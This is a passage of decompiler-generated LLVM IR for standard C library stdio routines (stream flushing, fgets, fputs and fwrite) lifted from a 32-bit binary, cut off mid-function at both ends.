  %v0_804ee05.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ee02

dec_label_pc_804ee02:                             ; preds = %dec_label_pc_804eddc, %dec_label_pc_804edf1
  %v0_804ee05 = phi i32 [ %v5_804ede3, %dec_label_pc_804eddc ], [ %v0_804ee05.pre, %dec_label_pc_804edf1 ]
  store i32 %v0_804edae, i32* @ebx, align 4
  store i32 %v0_804edad, i32* @esi, align 4
  store i32 %v0_804edac, i32* @edi, align 4
  ret i32 %v0_804ee05

; uselistorder directives
  uselistorder i32 %v12_804edaf, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ee02, { 1, 0 }
  uselistorder label %dec_label_pc_804eddc, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804ee1b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ee1b, i32* @eax, align 4
  %v2_804ee20 = call i32 @__pthread_return_void(i32 %v2_804ee1b, i32 134550743)
  %v1_804ee2c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  %v0_804ee31 = load i32, i32* @global_var_805c4e4.186, align 4
  %v8_804ee39 = icmp eq i32 %v0_804ee31, 1
  %v1_804ee3a = icmp eq i1 %v8_804ee39, false
  br i1 %v1_804ee3a, label %dec_label_pc_804eed1, label %dec_label_pc_804ee40

dec_label_pc_804ee40:                             ; preds = %entry
  %v0_804ee40 = load i32, i32* @global_var_805c4e8.187, align 8
  %tmp29 = icmp slt i32 %v0_804ee40, 1
  br i1 %tmp29, label %dec_label_pc_804eed1, label %dec_label_pc_804ee4d

dec_label_pc_804ee4d:                             ; preds = %dec_label_pc_804ee40
  store i32 0, i32* @esi, align 4
  %v2_804ee5a = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804ee5a, i32* @eax, align 4
  %v2_804ee5f = call i32 @__pthread_return_void(i32 %v2_804ee5a, i32 134550743)
  %v1_804ee6b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.189 to i32))
  %v0_804ee70 = load i32, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 8
  store i32 %v0_804ee70, i32* %edx.global-to-local, align 4
  %v1_804eeb23 = icmp eq i32 %v0_804ee70, 0
  %v1_804eeb410 = icmp eq i1 %v1_804eeb23, false
  br i1 %v1_804eeb410, label %dec_label_pc_804ee7b, label %dec_label_pc_804eeb6

dec_label_pc_804ee7b:                             ; preds = %dec_label_pc_804ee4d, %dec_label_pc_804eeb0
  %v0_804ee8b = phi i32 [ %v0_804eeb0, %dec_label_pc_804eeb0 ], [ %v0_804ee70, %dec_label_pc_804ee4d ]
  %v1_804ee7b13 = inttoptr i32 %v0_804ee8b to i16*
  %v2_804ee7b = load i16, i16* %v1_804ee7b13, align 2
  %v1_804ee83 = add i32 %v0_804ee8b, 32
  %v2_804ee83 = inttoptr i32 %v1_804ee83 to i32*
  %v3_804ee83 = load i32, i32* %v2_804ee83, align 4
  store i32 %v3_804ee83, i32* @ebx, align 4
  %v1_804ee7e = and i16 %v2_804ee7b, -32720
  %v6_804ee86 = icmp eq i16 %v1_804ee7e, 48
  br i1 %v6_804ee86, label %dec_label_pc_804ee8f, label %dec_label_pc_804ee8b

dec_label_pc_804ee8b:                             ; preds = %dec_label_pc_804ee7b
  store i32 %v0_804ee8b, i32* @esi, align 4
  br label %dec_label_pc_804eeb0

dec_label_pc_804ee8f:                             ; preds = %dec_label_pc_804ee7b
  %v0_804ee8f = load i32, i32* @esi, align 4
  %v1_804ee8f = icmp eq i32 %v0_804ee8f, 0
  %v1_804ee91 = icmp eq i1 %v1_804ee8f, false
  br i1 %v1_804ee91, label %dec_label_pc_804ee9b, label %dec_label_pc_804ee93

dec_label_pc_804ee93:                             ; preds = %dec_label_pc_804ee8f
  store i32 %v3_804ee83, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 8
  br label %dec_label_pc_804ee9e

dec_label_pc_804ee9b:                             ; preds = %dec_label_pc_804ee8f
  %v2_804ee9b = add i32 %v0_804ee8f, 32
  %v3_804ee9b = inttoptr i32 %v2_804ee9b to i32*
  store i32 %v3_804ee83, i32* %v3_804ee9b, align 4
  %v0_804ee9e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee9e

dec_label_pc_804ee9e:                             ; preds = %dec_label_pc_804ee93, %dec_label_pc_804ee9b
  %v0_804eea7 = phi i32 [ %v0_804ee8b, %dec_label_pc_804ee93 ], [ %v0_804ee9e.pre, %dec_label_pc_804ee9b ]
  %v1_804ee9e = add i32 %v0_804eea7, 1
  %v2_804ee9e = inttoptr i32 %v1_804ee9e to i8*
  %v3_804ee9e = load i8, i8* %v2_804ee9e, align 1
  %v4_804ee9e = and i8 %v3_804ee9e, 32
  %v5_804ee9e = icmp eq i8 %v4_804ee9e, 0
  br i1 %v5_804ee9e, label %dec_label_pc_804eeb0, label %dec_label_pc_804eea4

dec_label_pc_804eea4:                             ; preds = %dec_label_pc_804ee9e
  %v1_804eea8 = call i32 @free(i32 %v0_804eea7)
  br label %dec_label_pc_804eeb0

dec_label_pc_804eeb0:                             ; preds = %dec_label_pc_804ee9e, %dec_label_pc_804ee8b, %dec_label_pc_804eea4
  %v0_804eeb0 = load i32, i32* @ebx, align 4
  store i32 %v0_804eeb0, i32* %edx.global-to-local, align 4
  %v1_804eeb2 = icmp eq i32 %v0_804eeb0, 0
  %v1_804eeb4 = icmp eq i1 %v1_804eeb2, false
  br i1 %v1_804eeb4, label %dec_label_pc_804ee7b, label %dec_label_pc_804eeb6

dec_label_pc_804eeb6:                             ; preds = %dec_label_pc_804eeb0, %dec_label_pc_804ee4d
  store i32 %v2_804ee5a, i32* @eax, align 4
  %v2_804eebf = call i32 @__pthread_return_void(i32 %v2_804ee5a, i32 1)
  store i32 0, i32* @global_var_805c4e8.187, align 8
  %v0_804eed1.pre = load i32, i32* @global_var_805c4e4.186, align 4
  br label %dec_label_pc_804eed1

dec_label_pc_804eed1:                             ; preds = %dec_label_pc_804ee40, %entry, %dec_label_pc_804eeb6
  %v0_804eed1 = phi i32 [ %v0_804ee31, %dec_label_pc_804ee40 ], [ %v0_804ee31, %entry ], [ %v0_804eed1.pre, %dec_label_pc_804eeb6 ]
  %v1_804eed6 = add i32 %v0_804eed1, -1
  store i32 %v1_804eed6, i32* @global_var_805c4e4.186, align 4
  store i32 %v2_804ee1b, i32* @eax, align 4
  %v2_804eee5 = call i32 @__pthread_return_void(i32 %v2_804ee1b, i32 1)
  ret i32 %v2_804eee5

; uselistorder directives
  uselistorder i32 %v0_804eeb0, { 1, 2, 0 }
  uselistorder i32 %v0_804ee8b, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ee31, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804eed1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eeb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ee9e, { 1, 0 }
  uselistorder label %dec_label_pc_804ee7b, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804eef0 = load i32, i32* @ebp, align 4
  %v0_804eef1 = load i32, i32* @edi, align 4
  %v0_804eef2 = load i32, i32* @esi, align 4
  %v0_804eef3 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804eef9 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804eef9, i32* @ebx, align 4
  %v10_804eefd = icmp eq i16* %arg1, inttoptr (i32 134578744 to i16*)
  br i1 %v10_804eefd, label %dec_label_pc_804ef12, label %dec_label_pc_804ef05

dec_label_pc_804ef05:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804ef0a = icmp eq i16* %arg1, null
  %v1_804ef0c = icmp eq i1 %v2_804ef0a, false
  br i1 %v1_804ef0c, label %dec_label_pc_804f001, label %dec_label_pc_804ef12

dec_label_pc_804ef12:                             ; preds = %dec_label_pc_804ef05, %entry
  store i32 0, i32* @edi, align 4
  %v2_804ef1f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ef1f, i32* @ebx, align 4
  %v2_804ef24 = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 134550743)
  %v1_804ef30 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.185 to i32))
  store i32 ptrtoint (i32* @global_var_8058254.185 to i32), i32* @ecx, align 4
  %v0_804ef36 = load i32, i32* @global_var_805c4e4.186, align 4
  %v1_804ef3c = add i32 %v0_804ef36, 1
  store i32 %v1_804ef3c, i32* @eax, align 4
  store i32 %v1_804ef3c, i32* @global_var_805c4e4.186, align 4
  %v2_804ef45 = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 1)
  store i32 %v2_804ef45, i32* @eax, align 4
  %v2_804ef58 = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 134550743)
  %v1_804ef64 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.189 to i32))
  store i32 ptrtoint (i32* @global_var_805823c.189 to i32), i32* @eax, align 4
  %v0_804ef6d = load i32, i32* bitcast (i32** @global_var_8058238.190 to i32*), align 8
  store i32 %v0_804ef6d, i32* @esi, align 4
  %v2_804ef74 = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 1)
  %v0_804eff61 = load i32, i32* @esi, align 4
  %v1_804eff62 = icmp eq i32 %v0_804eff61, 0
  %v1_804eff89 = icmp eq i1 %v1_804eff62, false
  br i1 %v1_804eff89, label %dec_label_pc_804ef7e, label %dec_label_pc_804effa

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef12, %dec_label_pc_804eff3
  %v0_804ef8c = phi i32 [ %v3_804eff3, %dec_label_pc_804eff3 ], [ %v0_804eff61, %dec_label_pc_804ef12 ]
  %v1_804ef7e = inttoptr i32 %v0_804ef8c to i8*
  %v2_804ef7e = load i8, i8* %v1_804ef7e, align 1
  %v3_804ef7e = and i8 %v2_804ef7e, 64
  %v4_804ef7e = icmp eq i8 %v3_804ef7e, 0
  br i1 %v4_804ef7e, label %dec_label_pc_804eff3, label %dec_label_pc_804ef83

dec_label_pc_804ef83:                             ; preds = %dec_label_pc_804ef7e
  %v0_804ef83 = load i32, i32* @global_var_805826c.188, align 4
  %v9_804ef83 = icmp eq i32 %v0_804ef83, 2
  br i1 %v9_804ef83, label %dec_label_pc_804efab, label %dec_label_pc_804ef8c

dec_label_pc_804ef8c:                             ; preds = %dec_label_pc_804ef83
  %v1_804ef8c = add i32 %v0_804ef8c, 56
  store i32 %v1_804ef8c, i32* @ebx, align 4
  store i32 %v2_804ef1f, i32* @eax, align 4
  %v2_804ef9b = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 134550743)
  %v0_804efa0 = load i32, i32* @ebx, align 4
  %v1_804efa3 = call i32 @__pthread_return_0(i32 %v0_804efa0)
  %v1_804efad.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804efab

dec_label_pc_804efab:                             ; preds = %dec_label_pc_804ef83, %dec_label_pc_804ef8c
  %v0_804efbd = phi i32 [ %v0_804ef8c, %dec_label_pc_804ef83 ], [ %v1_804efad.pre, %dec_label_pc_804ef8c ]
  %v0_804efab = load i32, i32* @ebp, align 4
  %v2_804efad = inttoptr i32 %v0_804efbd to i32*
  %v3_804efad = load i32, i32* %v2_804efad, align 4
  %v4_804efad = or i32 %v3_804efad, %v0_804efab
  %v2_804efaf = urem i32 %v4_804efad, 65536
  %v9_804efaf = and i32 %v2_804efaf, 832
  %v2_804efb3 = icmp eq i32 %v9_804efaf, 320
  %v1_804efb8 = icmp eq i1 %v2_804efb3, false
  br i1 %v1_804efb8, label %dec_label_pc_804efd9, label %dec_label_pc_804efba

dec_label_pc_804efba:                             ; preds = %dec_label_pc_804efab
  %v1_804efbe = call i32 @__stdio_wcommit(i32 %v0_804efbd)
  %v1_804efc6 = icmp eq i32 %v1_804efbe, 0
  br i1 %v1_804efc6, label %dec_label_pc_804efcf, label %dec_label_pc_804efca

dec_label_pc_804efca:                             ; preds = %dec_label_pc_804efba
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804efd9

dec_label_pc_804efcf:                             ; preds = %dec_label_pc_804efba
  %v0_804efcf = load i32, i32* @esi, align 4
  %v1_804efcf = inttoptr i32 %v0_804efcf to i16*
  %v2_804efcf = load i16, i16* %v1_804efcf, align 2
  %v3_804efcf = and i16 %v2_804efcf, -65
  store i16 %v3_804efcf, i16* %v1_804efcf, align 2
  %v0_804efd3 = load i32, i32* @esi, align 4
  %v1_804efd3 = add i32 %v0_804efd3, 8
  %v2_804efd3 = inttoptr i32 %v1_804efd3 to i32*
  %v3_804efd3 = load i32, i32* %v2_804efd3, align 4
  %v2_804efd6 = add i32 %v0_804efd3, 28
  %v3_804efd6 = inttoptr i32 %v2_804efd6 to i32*
  store i32 %v3_804efd3, i32* %v3_804efd6, align 4
  br label %dec_label_pc_804efd9

dec_label_pc_804efd9:                             ; preds = %dec_label_pc_804efab, %dec_label_pc_804efca, %dec_label_pc_804efcf
  %v0_804efd9 = load i32, i32* @global_var_805826c.188, align 4
  %v9_804efd9 = icmp eq i32 %v0_804efd9, 2
  br i1 %v9_804efd9, label %dec_label_pc_804eff3, label %dec_label_pc_804efe2

dec_label_pc_804efe2:                             ; preds = %dec_label_pc_804efd9
  store i32 %v2_804ef1f, i32* @eax, align 4
  %v2_804efeb = call i32 @__pthread_return_void(i32 %v2_804ef1f, i32 1)
  br label %dec_label_pc_804eff3

dec_label_pc_804eff3:                             ; preds = %dec_label_pc_804efd9, %dec_label_pc_804ef7e, %dec_label_pc_804efe2
  %v0_804eff3 = load i32, i32* @esi, align 4
  %v1_804eff3 = add i32 %v0_804eff3, 32
  %v2_804eff3 = inttoptr i32 %v1_804eff3 to i32*
  %v3_804eff3 = load i32, i32* %v2_804eff3, align 4
  store i32 %v3_804eff3, i32* @esi, align 4
  %v1_804eff6 = icmp eq i32 %v3_804eff3, 0
  %v1_804eff8 = icmp eq i1 %v1_804eff6, false
  br i1 %v1_804eff8, label %dec_label_pc_804ef7e, label %dec_label_pc_804effa

dec_label_pc_804effa:                             ; preds = %dec_label_pc_804eff3, %dec_label_pc_804ef12
  %v0_804effa = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f027

dec_label_pc_804f001:                             ; preds = %dec_label_pc_804ef05
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f003 = load i8, i8* %tmp23, align 1
  %v4_804f003 = and i8 %v3_804f003, 64
  %v5_804f003 = icmp eq i8 %v4_804f003, 0
  br i1 %v5_804f003, label %dec_label_pc_804f027, label %dec_label_pc_804f008

dec_label_pc_804f008:                             ; preds = %dec_label_pc_804f001
  store i32 -1, i32* @edi, align 4
  %v1_804f00f = call i32 @__stdio_wcommit(i32 %v4_804eef9)
  %v1_804f017 = icmp eq i32 %v1_804f00f, 0
  %v1_804f019 = icmp eq i1 %v1_804f017, false
  br i1 %v1_804f019, label %dec_label_pc_804f027, label %dec_label_pc_804f01b

dec_label_pc_804f01b:                             ; preds = %dec_label_pc_804f008
  %v3_804f01b = load i16, i16* %arg1, align 2
  %v4_804f01b = and i16 %v3_804f01b, -65
  store i16 %v4_804f01b, i16* %arg1, align 2
  %v2_804f01f = add i32 %v4_804eef9, 8
  %v3_804f01f = inttoptr i32 %v2_804f01f to i32*
  %v4_804f01f = load i32, i32* %v3_804f01f, align 4
  %v3_804f022 = add i32 %v4_804eef9, 28
  %v4_804f022 = inttoptr i32 %v3_804f022 to i32*
  store i32 %v4_804f01f, i32* %v4_804f022, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f027

dec_label_pc_804f027:                             ; preds = %dec_label_pc_804f008, %dec_label_pc_804f001, %dec_label_pc_804effa, %dec_label_pc_804f01b
  %v0_804f02a = load i32, i32* @edi, align 4
  store i32 %v0_804eef3, i32* @ebx, align 4
  store i32 %v0_804eef2, i32* @esi, align 4
  store i32 %v0_804eef1, i32* @edi, align 4
  store i32 %v0_804eef0, i32* @ebp, align 4
  ret i32 %v0_804f02a

; uselistorder directives
  uselistorder i32 %v3_804eff3, { 1, 2, 0 }
  uselistorder i32 %v2_804ef1f, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_8058238.190 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805c4e4.186, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8058254.185 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804f027, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eff3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804efd9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804efab, { 1, 0 }
  uselistorder label %dec_label_pc_804ef7e, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f034 = load i32, i32* @ebp, align 4
  %v4_804f03b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f03b, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f03b, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804f085.preheader, label %dec_label_pc_804f091

dec_label_pc_804f085.preheader:                   ; preds = %entry
  %v1_804f08519 = add i32 %arg2, -1
  %v8_804f08520 = icmp eq i32 %v1_804f08519, 0
  store i32 %v1_804f08519, i32* @esi, align 4
  %v1_804f08621 = icmp eq i1 %v8_804f08520, false
  br i1 %v1_804f08621, label %dec_label_pc_804f04f, label %dec_label_pc_804f088

dec_label_pc_804f04f:                             ; preds = %dec_label_pc_804f085.preheader, %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge.dec_label_pc_804f04f_crit_edge
  %v0_804f04f = phi i32 [ %v0_804f04f.pre, %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge.dec_label_pc_804f04f_crit_edge ], [ %arg3, %dec_label_pc_804f085.preheader ]
  %v1_804f04f = add i32 %v0_804f04f, 16
  %v2_804f04f = inttoptr i32 %v1_804f04f to i32*
  %v3_804f04f = load i32, i32* %v2_804f04f, align 4
  store i32 %v3_804f04f, i32* %eax.global-to-local, align 4
  %v2_804f052 = add i32 %v0_804f04f, 24
  %v3_804f052 = inttoptr i32 %v2_804f052 to i32*
  %v4_804f052 = load i32, i32* %v3_804f052, align 4
  %v10_804f052 = icmp ult i32 %v3_804f04f, %v4_804f052
  %v1_804f055 = icmp eq i1 %v10_804f052, false
  br i1 %v1_804f055, label %dec_label_pc_804f065, label %dec_label_pc_804f057

dec_label_pc_804f057:                             ; preds = %dec_label_pc_804f04f
  %v1_804f057 = inttoptr i32 %v3_804f04f to i8*
  %v2_804f057 = load i8, i8* %v1_804f057, align 1
  %v3_804f057 = zext i8 %v2_804f057 to i32
  %v4_804f057 = load i32, i32* @edx, align 4
  %v5_804f057 = and i32 %v4_804f057, -256
  %v6_804f057 = or i32 %v5_804f057, %v3_804f057
  store i32 %v6_804f057, i32* @edx, align 4
  %v1_804f059 = add i32 %v3_804f04f, 1
  store i32 %v1_804f059, i32* %eax.global-to-local, align 4
  %v2_804f05a = load i32, i32* @ebx, align 4
  %v3_804f05a = inttoptr i32 %v2_804f05a to i8*
  store i8 %v2_804f057, i8* %v3_804f05a, align 1
  %v0_804f05c = load i32, i32* @ebx, align 4
  %v1_804f05c = add i32 %v0_804f05c, 1
  store i32 %v1_804f05c, i32* @ebx, align 4
  %v0_804f05d = load i32, i32* @edx, align 4
  %v1_804f05d = trunc i32 %v0_804f05d to i8
  %v10_804f05d = icmp eq i8 %v1_804f05d, 10
  %v0_804f060 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f060 = load i32, i32* @ebp, align 4
  %v2_804f060 = add i32 %v1_804f060, 16
  %v3_804f060 = inttoptr i32 %v2_804f060 to i32*
  store i32 %v0_804f060, i32* %v3_804f060, align 4
  br i1 %v10_804f05d, label %dec_label_pc_804f088, label %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge

dec_label_pc_804f065:                             ; preds = %dec_label_pc_804f04f
  %v0_804f069 = call i32 @getc_unlocked()
  %v1_804f069 = trunc i32 %v0_804f069 to i8
  store i32 %v0_804f069, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804f069, 256
  %v11_804f071 = icmp eq i32 %sext.mask, 255
  %v1_804f074 = icmp eq i1 %v11_804f071, false
  br i1 %v1_804f074, label %dec_label_pc_804f083, label %dec_label_pc_804f076

dec_label_pc_804f076:                             ; preds = %dec_label_pc_804f065
  %v0_804f076 = load i32, i32* @ebp, align 4
  %v1_804f076 = inttoptr i32 %v0_804f076 to i8*
  %v2_804f076 = load i8, i8* %v1_804f076, align 1
  %v3_804f076 = and i8 %v2_804f076, 8
  %v4_804f076 = icmp eq i8 %v3_804f076, 0
  br i1 %v4_804f076, label %dec_label_pc_804f088, label %dec_label_pc_804f091

dec_label_pc_804f083:                             ; preds = %dec_label_pc_804f065
  %v3_804f07e = load i32, i32* @ebx, align 4
  %v4_804f07e = inttoptr i32 %v3_804f07e to i8*
  store i8 %v1_804f069, i8* %v4_804f07e, align 1
  %v0_804f080 = load i32, i32* @ebx, align 4
  %v1_804f080 = add i32 %v0_804f080, 1
  store i32 %v1_804f080, i32* @ebx, align 4
  %v11_804f081 = icmp eq i8 %v1_804f069, 10
  br i1 %v11_804f081, label %dec_label_pc_804f088, label %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge

dec_label_pc_804f083.dec_label_pc_804f085_crit_edge: ; preds = %dec_label_pc_804f057, %dec_label_pc_804f083
  %v0_804f085.pre = load i32, i32* @esi, align 4
  %v1_804f085 = add i32 %v0_804f085.pre, -1
  %v8_804f085 = icmp eq i32 %v1_804f085, 0
  store i32 %v1_804f085, i32* @esi, align 4
  %v1_804f086 = icmp eq i1 %v8_804f085, false
  br i1 %v1_804f086, label %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge.dec_label_pc_804f04f_crit_edge, label %dec_label_pc_804f088

dec_label_pc_804f083.dec_label_pc_804f085_crit_edge.dec_label_pc_804f04f_crit_edge: ; preds = %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge
  %v0_804f04f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f04f

dec_label_pc_804f088:                             ; preds = %dec_label_pc_804f085.preheader, %dec_label_pc_804f057, %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge, %dec_label_pc_804f083, %dec_label_pc_804f076
  %v0_804f088 = load i32, i32* @ebx, align 4
  %v1_804f088 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804f088, %v1_804f088
  br i1 %tmp23, label %dec_label_pc_804f08c, label %dec_label_pc_804f091

dec_label_pc_804f08c:                             ; preds = %dec_label_pc_804f088
  %v1_804f08c = inttoptr i32 %v0_804f088 to i8*
  store i8 0, i8* %v1_804f08c, align 1
  %v0_804f096.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f093

dec_label_pc_804f091:                             ; preds = %dec_label_pc_804f088, %dec_label_pc_804f076, %entry
  br label %dec_label_pc_804f093

dec_label_pc_804f093:                             ; preds = %dec_label_pc_804f08c, %dec_label_pc_804f091
  %v0_804f096 = phi i32 [ %v0_804f096.pre, %dec_label_pc_804f08c ], [ 0, %dec_label_pc_804f091 ]
  store i32 %v0_804f096, i32* %eax.global-to-local, align 4
  store i32 %v0_804f034, i32* @ebp, align 4
  ret i32 %v0_804f096

; uselistorder directives
  uselistorder i32 %v0_804f096, { 1, 0 }
  uselistorder i32 %v0_804f088, { 1, 0 }
  uselistorder i32 %v1_804f085, { 1, 0 }
  uselistorder i32 %v0_804f069, { 0, 2, 1 }
  uselistorder i32 %v0_804f04f, { 1, 0 }
  uselistorder label %dec_label_pc_804f093, { 1, 0 }
  uselistorder label %dec_label_pc_804f088, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f083.dec_label_pc_804f085_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f04f, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f0a0 = load i32, i32* @esi, align 4
  %v0_804f0a1 = load i32, i32* @ebx, align 4
  store i32 %v0_804f0a1, i32* %stack_var_-8, align 4
  %v4_804f0a5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f0a5, i32* @ebx, align 4
  %v3_804f0aa = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f0aa, i32* @esi, align 4
  %v0_804f0bb = load i32, i32* @ebx, align 4
  %v6_804f0bc = call i32 @__GI_fwrite_unlocked(i32 %v0_804f0bb, i64 1, i32 %v3_804f0aa, i32 %arg2)
  %v1_804f0c7 = load i32, i32* @esi, align 4
  %v12_804f0c7 = icmp eq i32 %v6_804f0bc, %v1_804f0c7
  %v1_804f0c9 = icmp eq i1 %v12_804f0c7, false
  br i1 %v1_804f0c9, label %dec_label_pc_804f0cd, label %dec_label_pc_804f0cb

dec_label_pc_804f0cb:                             ; preds = %entry
  br label %dec_label_pc_804f0cd

dec_label_pc_804f0cd:                             ; preds = %entry, %dec_label_pc_804f0cb
  %v0_804f0cd = phi i32 [ -1, %entry ], [ %v6_804f0bc, %dec_label_pc_804f0cb ]
  %v2_804f0d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f0d0, i32* @ebx, align 4
  store i32 %v0_804f0a0, i32* @esi, align 4
  ret i32 %v0_804f0cd

; uselistorder directives
  uselistorder i32 %v6_804f0bc, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f0cd, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f0d4 = load i32, i32* @edi, align 4
  %v0_804f0d5 = load i32, i32* @esi, align 4
  %v0_804f0d6 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f0db = trunc i64 %arg2 to i32
  store i32 %v4_804f0db, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f0e3 = inttoptr i32 %arg4 to i16*
  %v2_804f0e3 = load i16, i16* %v1_804f0e3, align 2
  %v1_804f0e6 = and i16 %v2_804f0e3, 192
  %v6_804f0eb = icmp eq i16 %v1_804f0e6, 192
  br i1 %v6_804f0eb, label %dec_label_pc_804f106, label %dec_label_pc_804f0f2

dec_label_pc_804f0f2:                             ; preds = %entry
  %v0_804f0f2 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f0fa = call i32 @__stdio_trans2w_o(i16* %v1_804f0e3, i32 128, i32 %v0_804f0f2, i32 %v0_804f0f2, i32 %v0_804f0d6, i32 %v0_804f0d5, i32 %v0_804f0d4)
  %v1_804f102 = icmp eq i32 %v9_804f0fa, 0
  %v1_804f104 = icmp eq i1 %v1_804f102, false
  br i1 %v1_804f104, label %dec_label_pc_804f142, label %dec_label_pc_804f106

dec_label_pc_804f106:                             ; preds = %dec_label_pc_804f0f2, %entry
  %v2_804f106 = icmp eq i32 %v4_804f0db, 0
  br i1 %v2_804f106, label %dec_label_pc_804f142, label %dec_label_pc_804f10a

dec_label_pc_804f10a:                             ; preds = %dec_label_pc_804f106
  %v1_804f10a = icmp eq i32 %arg3, 0
  br i1 %v1_804f10a, label %dec_label_pc_804f142, label %dec_label_pc_804f10e

dec_label_pc_804f10e:                             ; preds = %dec_label_pc_804f10a
  %v9_804f113 = udiv i64 4294967295, %arg2
  %v10_804f113 = trunc i64 %v9_804f113 to i32
  %v6_804f117 = icmp ult i32 %v10_804f113, %arg3
  br i1 %v6_804f117, label %dec_label_pc_804f133, label %dec_label_pc_804f119

dec_label_pc_804f119:                             ; preds = %dec_label_pc_804f10e
  %sext = mul i64 %arg2, 4294967296
  %v2_804f11c = sdiv i64 %sext, 4294967296
  %v3_804f11c = sext i32 %arg3 to i64
  %v4_804f11c = mul nsw i64 %v3_804f11c, %v2_804f11c
  %v5_804f11c = trunc i64 %v4_804f11c to i32
  %v0_804f11f = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f125 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f11c, i32 %v0_804f11f, i32 %v10_804f113)
  %v6_804f125 = sext i32 %v5_804f125 to i64
  %v10_804f12c = udiv i64 %v6_804f125, %arg2
  %v11_804f12c = trunc i64 %v10_804f12c to i32
  br label %dec_label_pc_804f144

dec_label_pc_804f133:                             ; preds = %dec_label_pc_804f10e
  %v0_804f133 = load i32, i32* @ebx, align 4
  %v1_804f133 = inttoptr i32 %v0_804f133 to i16*
  %v2_804f133 = load i16, i16* %v1_804f133, align 2
  %v3_804f133 = or i16 %v2_804f133, 8
  store i16 %v3_804f133, i16* %v1_804f133, align 2
